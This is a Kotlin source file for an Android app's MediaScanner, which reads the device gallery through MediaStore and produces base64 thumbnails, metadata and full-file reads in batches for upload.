package com.example.gmaagent.data

import android.content.ContentUris
import android.content.Context
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.net.Uri
import android.os.Build
import android.provider.MediaStore
import android.util.Base64
import android.util.Log
import android.util.Size
import com.example.gmaagent.network.MediaThumbnailEntry
import java.io.ByteArrayOutputStream
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.TimeZone

/**
 * Scans the device gallery via MediaStore API and generates
 * compressed thumbnails (<50KB) for efficient upload.
 *
 * Supports both images (MediaStore.Images) and videos (MediaStore.Video).
 */
object MediaScanner {

    private const val TAG = "MediaScanner"
    private const val THUMBNAIL_MAX_SIZE = 200   // px
    private const val THUMBNAIL_QUALITY = 40     // JPEG quality for <50KB
    private const val BATCH_SIZE = 20            // thumbnails per sync batch

    private val isoFormat = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.US).apply {
        timeZone = TimeZone.getTimeZone("UTC")
    }

    // ── Image Scanning ──────────────────────────────────────

    /**
     * Scans the gallery for images and generates thumbnails.
     * @param context Application context
     * @param limit Max number of images to scan (0 = all)
     * @param existingIds Set of media_store_ids already synced (to skip duplicates)
     * @return List of [MediaThumbnailEntry] ready for upload
     */
    fun scanImages(
        context: Context,
        limit: Int = 200,
        existingIds: Set<String> = emptySet()
    ): List<MediaThumbnailEntry> {
        val results = mutableListOf<MediaThumbnailEntry>()

        val collection = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            MediaStore.Images.Media.getContentUri(MediaStore.VOLUME_EXTERNAL)
        } else {
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI
        }

        val projection = arrayOf(
            MediaStore.Images.Media._ID,
            MediaStore.Images.Media.DISPLAY_NAME,
            MediaStore.Images.Media.SIZE,
            MediaStore.Images.Media.WIDTH,
            MediaStore.Images.Media.HEIGHT,
            MediaStore.Images.Media.MIME_TYPE,
            MediaStore.Images.Media.DATE_TAKEN,
        )

        val sortOrder = "${MediaStore.Images.Media.DATE_TAKEN} DESC"
        val queryLimit = if (limit > 0) " LIMIT $limit" else ""

        try {
            context.contentResolver.query(
                collection,
                projection,
                null,
                null,
                "$sortOrder$queryLimit"
            )?.use { cursor ->
                val idCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
                val nameCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
                val sizeCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE)
                val widthCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.WIDTH)
                val heightCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.HEIGHT)
                val mimeCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.MIME_TYPE)
                val dateCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_TAKEN)

                while (cursor.moveToNext()) {
                    try {
                        val id = cursor.getLong(idCol)
                        val storeId = "image_$id"

                        if (storeId in existingIds) continue

                        val contentUri = ContentUris.withAppendedId(collection, id)
                        val thumbnail = generateThumbnail(context, contentUri, "image")
                            ?: continue

                        val dateTaken = cursor.getLong(dateCol)

                        results.add(
                            MediaThumbnailEntry(
                                media_store_id = storeId,
                                media_type = "image",
                                file_name = cursor.getString(nameCol),
                                file_size = cursor.getInt(sizeCol),
                                width = cursor.getInt(widthCol),
                                height = cursor.getInt(heightCol),
                                mime_type = cursor.getString(mimeCol),
                                date_taken = if (dateTaken > 0) isoFormat.format(Date(dateTaken)) else null,
                                thumbnail_b64 = thumbnail,
                            )
                        )
                    } catch (e: Exception) {
                        Log.w(TAG, "Failed to process image: ${e.message}")
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error scanning images", e)
        }

        Log.i(TAG, "Scanned ${results.size} images")
        return results
    }

    // ── Video Scanning ──────────────────────────────────────

    /**
     * Scans the gallery for videos and generates thumbnails.
     */
    fun scanVideos(
        context: Context,
        limit: Int = 100,
        existingIds: Set<String> = emptySet()
    ): List<MediaThumbnailEntry> {
        val results = mutableListOf<MediaThumbnailEntry>()

        val collection = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            MediaStore.Video.Media.getContentUri(MediaStore.VOLUME_EXTERNAL)
        } else {
            MediaStore.Video.Media.EXTERNAL_CONTENT_URI
        }

        val projection = arrayOf(
            MediaStore.Video.Media._ID,
            MediaStore.Video.Media.DISPLAY_NAME,
            MediaStore.Video.Media.SIZE,
            MediaStore.Video.Media.WIDTH,
            MediaStore.Video.Media.HEIGHT,
            MediaStore.Video.Media.DURATION,
            MediaStore.Video.Media.MIME_TYPE,
            MediaStore.Video.Media.DATE_TAKEN,
        )

        val sortOrder = "${MediaStore.Video.Media.DATE_TAKEN} DESC"

        try {
            context.contentResolver.query(
                collection,
                projection,
                null,
                null,
                sortOrder
            )?.use { cursor ->
                val idCol = cursor.getColumnIndexOrThrow(MediaStore.Video.Media._ID)
                val nameCol = cursor.getColumnIndexOrThrow(MediaStore.Video.Media.DISPLAY_NAME)
                val sizeCol = cursor.getColumnIndexOrThrow(MediaStore.Video.Media.SIZE)
                val widthCol = cursor.getColumnIndexOrThrow(MediaStore.Video.Media.WIDTH)
                val heightCol = cursor.getColumnIndexOrThrow(MediaStore.Video.Media.HEIGHT)
                val durCol = cursor.getColumnIndexOrThrow(MediaStore.Video.Media.DURATION)
                val mimeCol = cursor.getColumnIndexOrThrow(MediaStore.Video.Media.MIME_TYPE)
                val dateCol = cursor.getColumnIndexOrThrow(MediaStore.Video.Media.DATE_TAKEN)

                var count = 0
                while (cursor.moveToNext() && count < limit) {
                    try {
                        val id = cursor.getLong(idCol)
                        val storeId = "video_$id"

                        if (storeId in existingIds) continue

                        val contentUri = ContentUris.withAppendedId(collection, id)
                        val thumbnail = generateThumbnail(context, contentUri, "video")
                            ?: continue

                        val dateTaken = cursor.getLong(dateCol)

                        results.add(
                            MediaThumbnailEntry(
                                media_store_id = storeId,
                                media_type = "video",
                                file_name = cursor.getString(nameCol),
                                file_size = cursor.getInt(sizeCol),
                                width = cursor.getInt(widthCol),
                                height = cursor.getInt(heightCol),
                                duration_ms = cursor.getInt(durCol),
                                mime_type = cursor.getString(mimeCol),
                                date_taken = if (dateTaken > 0) isoFormat.format(Date(dateTaken)) else null,
                                thumbnail_b64 = thumbnail,
                            )
                        )
                        count++
                    } catch (e: Exception) {
                        Log.w(TAG, "Failed to process video: ${e.message}")
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error scanning videos", e)
        }

        Log.i(TAG, "Scanned ${results.size} videos")
        return results
    }

    // ── Thumbnail Generation ────────────────────────────────

    /**
     * Generates a compressed JPEG thumbnail (<50KB) for a media content URI.
     * Returns base64-encoded string, or null on failure.
     */
    private fun generateThumbnail(context: Context, uri: Uri, type: String): String? {
        return try {
            val bitmap = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                context.contentResolver.loadThumbnail(
                    uri,
                    Size(THUMBNAIL_MAX_SIZE, THUMBNAIL_MAX_SIZE),
                    null
                )
            } else {
                // Fallback: load and scale manually
                val options = BitmapFactory.Options().apply {
                    inJustDecodeBounds = true
                }
                context.contentResolver.openInputStream(uri)?.use {
                    BitmapFactory.decodeStream(it, null, options)
                }

                val scale = maxOf(
                    (options.outWidth.toFloat() / THUMBNAIL_MAX_SIZE),
                    (options.outHeight.toFloat() / THUMBNAIL_MAX_SIZE),
                    1f
                ).toInt()

                val scaleOptions = BitmapFactory.Options().apply {
                    inSampleSize = scale
                }
                context.contentResolver.openInputStream(uri)?.use {
                    BitmapFactory.decodeStream(it, null, scaleOptions)
                }
            }

            if (bitmap == null) return null

            // Scale down if still too large
            val scaledBitmap = if (bitmap.width > THUMBNAIL_MAX_SIZE || bitmap.height > THUMBNAIL_MAX_SIZE) {
                val ratio = minOf(
                    THUMBNAIL_MAX_SIZE.toFloat() / bitmap.width,
                    THUMBNAIL_MAX_SIZE.toFloat() / bitmap.height
                )
                Bitmap.createScaledBitmap(
                    bitmap,
                    (bitmap.width * ratio).toInt(),
                    (bitmap.height * ratio).toInt(),
                    true
                )
            } else {
                bitmap
            }

            // Compress to JPEG
            val baos = ByteArrayOutputStream()
            scaledBitmap.compress(Bitmap.CompressFormat.JPEG, THUMBNAIL_QUALITY, baos)

            // If still > 50KB, reduce quality further
            if (baos.size() > 50_000) {
                baos.reset()
                scaledBitmap.compress(Bitmap.CompressFormat.JPEG, 20, baos)
            }

            val b64 = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP)

            // Recycle if we created a new bitmap
            if (scaledBitmap !== bitmap) {
                scaledBitmap.recycle()
            }
            bitmap.recycle()

            b64
        } catch (e: Exception) {
            Log.w(TAG, "Failed to generate thumbnail for $uri: ${e.message}")
            null
        }
    }

    // ── Full File Reading ────────────────────────────────────

    /**
     * Reads the full-resolution file for a media_store_id and returns it as base64.
     * @param mediaStoreId The media_store_id (e.g., "image_12345" or "video_67890")
     * @return Pair of (base64Data, mimeType), or null if not found
     */
    fun readFullFile(context: Context, mediaStoreId: String): Pair<String, String?>? {
        try {
            val parts = mediaStoreId.split("_", limit = 2)
            if (parts.size != 2) return null

            val type = parts[0]
            val id = parts[1].toLongOrNull() ?: return null

            val uri = when (type) {
                "image" -> {
                    val collection = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                        MediaStore.Images.Media.getContentUri(MediaStore.VOLUME_EXTERNAL)
                    } else {
                        MediaStore.Images.Media.EXTERNAL_CONTENT_URI
                    }
                    ContentUris.withAppendedId(collection, id)
                }
                "video" -> {
                    val collection = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                        MediaStore.Video.Media.getContentUri(MediaStore.VOLUME_EXTERNAL)
                    } else {
                        MediaStore.Video.Media.EXTERNAL_CONTENT_URI
                    }
                    ContentUris.withAppendedId(collection, id)
                }
                else -> return null
            }

            // Read the mime type
            val mimeType = context.contentResolver.getType(uri)

            // Read the full file into base64
            val bytes = context.contentResolver.openInputStream(uri)?.use { it.readBytes() }
                ?: return null

            val b64 = Base64.encodeToString(bytes, Base64.NO_WRAP)

            Log.i(TAG, "Read full file for $mediaStoreId: ${bytes.size} bytes, mime=$mimeType")
            return Pair(b64, mimeType)

        } catch (e: Exception) {
            Log.e(TAG, "Error reading full file for $mediaStoreId", e)
            return null
        }
    }

    /**
     * Returns all gallery items in batches for upload.
     */
    fun scanAll(context: Context, existingIds: Set<String> = emptySet()): List<List<MediaThumbnailEntry>> {
        val allItems = mutableListOf<MediaThumbnailEntry>()
        allItems.addAll(scanImages(context, limit = 200, existingIds = existingIds))
        allItems.addAll(scanVideos(context, limit = 100, existingIds = existingIds))

        // Sort by date_taken descending
        allItems.sortByDescending { it.date_taken }

        // Split into batches
        return allItems.chunked(BATCH_SIZE)
    }
}
